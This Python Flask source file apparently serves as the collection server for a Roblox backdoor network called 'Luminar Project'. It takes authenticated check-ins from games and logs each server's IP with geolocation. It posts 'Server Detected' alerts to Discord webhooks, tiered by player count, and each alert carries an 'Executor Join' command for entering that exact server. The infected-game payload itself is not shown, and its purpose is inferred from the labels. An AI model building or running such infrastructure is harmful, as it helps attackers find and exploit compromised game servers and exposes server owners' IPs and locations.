import os, hashlib, time, requests, logging
from flask import Flask, request, jsonify
from collections import deque
from threading import Lock

app = Flask(__name__)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("LuminarProject")

AUTH_SECRET = os.environ.get('AUTH_SECRET')
WEBHOOKS = {
    "tier1": os.environ.get('WEBHOOK_0_50'),
    "tier2": os.environ.get('WEBHOOK_50_100'),
    "tier3": os.environ.get('WEBHOOK_100_500'),
    "tier4": os.environ.get('WEBHOOK_INFINITY')
}

webhook_queues = {}
webhook_locks = {}

def rate_limited_webhook(webhook_url, payload):
    if webhook_url not in webhook_queues:
        webhook_queues[webhook_url] = deque(maxlen=5)
        webhook_locks[webhook_url] = Lock()
    
    with webhook_locks[webhook_url]:
        now = time.time()
        
        while webhook_queues[webhook_url] and now - webhook_queues[webhook_url][0] > 5:
            webhook_queues[webhook_url].popleft()
        
        if len(webhook_queues[webhook_url]) >= 5:
            sleep_time = 5 - (now - webhook_queues[webhook_url][0])
            if sleep_time > 0:
                time.sleep(sleep_time)
                webhook_queues[webhook_url].popleft()
        
        webhook_queues[webhook_url].append(time.time())
        return requests.post(webhook_url, json=payload, timeout=5)

def get_location(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=3).json()
        if res.get('status') == 'success':
            return f"📍 {res['city']}, {res['country']} ({res['isp']})"
    except: pass
    return "Unknown Location"

def verify_luminar_security(provided_hash):
    if not provided_hash:
        return False
        
    current_min = time.gmtime().tm_min
    minutes_to_check = [current_min, (current_min - 1) % 60, (current_min - 2) % 60]
    
    for m in minutes_to_check:
        raw_string = f"{AUTH_SECRET}:{m}"
        expected = hashlib.sha256(raw_string.encode()).hexdigest()
        if provided_hash == expected:
            return True
    
    return False

@app.route('/webhook', methods=['POST'])
def handle_webhook():
    data = request.json
    provided_hash = request.headers.get('X-Luminar-Auth')
    
    place_id = data.get('placeId', 'Unknown')
    job_id = data.get('jobId', 'Studio/No-Job-Id')
    logger.info(f"📥 Request | Place: {place_id}")

    if not verify_luminar_security(provided_hash):
        return jsonify({"error": "Unauthorized"}), 401

    try:
        server_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
        
        # STEP 1: Get Universe ID from Place ID using multiget-place-details
        place_res = requests.get(
            f"https://games.roblox.com/v1/games/multiget-place-details?placeIds={place_id}",
            timeout=5
        ).json()
        
        if not place_res or len(place_res) == 0:
            logger.error(f"❌ Place {place_id} not found")
            return jsonify({"status": "skipped"}), 200
        
        place_info = place_res[0]
        u_id = place_info.get('universeId')
        game_name = place_info.get('name', 'Unknown')
        game_desc = place_info.get('description', '')
        
        logger.info(f"✅ Found: {game_name} | Universe: {u_id}")
        
        # STEP 2: Get detailed game info using Universe ID
        game_res = requests.get(
            f"https://games.roblox.com/v1/games?universeIds={u_id}",
            timeout=5
        ).json()
        
        if 'data' not in game_res or len(game_res['data']) == 0:
            logger.error(f"❌ No game data for universe {u_id}")
            return jsonify({"status": "skipped"}), 200
        
        game_data = game_res['data'][0]
        active = game_data.get('playing', 0)
        visits = game_data.get('visits', 0)
        favorites = game_data.get('favoritedCount', 0)
        updated = game_data.get('updated', 'Unknown')
        
        # STEP 3: Get votes
        try:
            v_res = requests.get(f"https://games.roblox.com/v1/games/votes?universeIds={u_id}", timeout=5).json()
            votes = v_res['data'][0] if 'data' in v_res and v_res['data'] else {'upVotes': 0}
        except:
            votes = {'upVotes': 0}
        
        # STEP 4: Get thumbnails
        try:
            icon_res = requests.get(
                f"https://thumbnails.roblox.com/v1/games/icons?universeIds={u_id}&size=256x256&format=Png&isCircular=false",
                timeout=5
            ).json()
            icon = icon_res['data'][0]['imageUrl'] if 'data' in icon_res and icon_res['data'] else 'https://via.placeholder.com/256'
        except:
            icon = 'https://via.placeholder.com/256'
        
        try:
            thumb_res = requests.get(
                f"https://thumbnails.roblox.com/v1/games/multiget/thumbnails?universeIds={u_id}&size=768x432&format=Png",
                timeout=5
            ).json()
            thumb = thumb_res['data'][0]['thumbnails'][0]['imageUrl'] if 'data' in thumb_res and thumb_res['data'] and thumb_res['data'][0].get('thumbnails') else 'https://via.placeholder.com/768x432'
        except:
            thumb = 'https://via.placeholder.com/768x432'

        # STEP 5: Tiered webhook routing
        if active >= 500: target = WEBHOOKS["tier4"]
        elif active >= 100: target = WEBHOOKS["tier3"]
        elif active >= 50: target = WEBHOOKS["tier2"]
        else: target = WEBHOOKS["tier1"]

        if not target:
            logger.error(f"❌ No webhook configured")
            return jsonify({"error": "Webhook not configured"}), 500

        # STEP 6: Send to Discord
        payload = {
            "embeds": [{
                "author": {"name": "Luminar Project | Intelligence", "icon_url": icon},
                "title": f"🚀 Server Detected: {game_name}",
                "url": f"https://www.roblox.com/games/{place_id}",
                "description": game_desc[:200] + "..." if len(game_desc) > 200 else game_desc,
                "color": 0xAC00FF,
                "image": {"url": thumb},
                "thumbnail": {"url": icon},
                "fields": [
                    {"name": "🌐 Server Location", "value": f"**IP:** `{server_ip}`\n{get_location(server_ip)}", "inline": False},
                    {"name": "👥 Population", "value": f"**Total Active:** {active:,}\n**Current Server:** {data.get('playerCount', '?')}/{data.get('maxPlayers', '?')}", "inline": True},
                    {"name": "📊 Statistics", "value": f"**Visits:** {visits:,}\n**Favorites:** {favorites:,}\n**Upvotes:** {votes.get('upVotes', 0):,}", "inline": True},
                    {"name": "💻 Executor Join", "value": f"```js\nRoblox.GameLauncher.joinGameInstance({place_id}, '{job_id}');\n```", "inline": False}
                ],
                "footer": {"text": f"Last Updated: {updated[:10]} • JobID: {job_id}"}
            }]
        }

        res = rate_limited_webhook(target, payload)
        
        if res.status_code in [200, 204]:
            logger.info(f"✅ Webhook sent | {game_name} | {active} players")
        elif res.status_code == 429:
            logger.warning(f"⚠️ Rate limited")
        else:
            logger.error(f"❌ Webhook failed: {res.status_code}")
        
        return jsonify({"status": "success"}), 200

    except Exception as e:
        logger.error(f"❌ Error: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
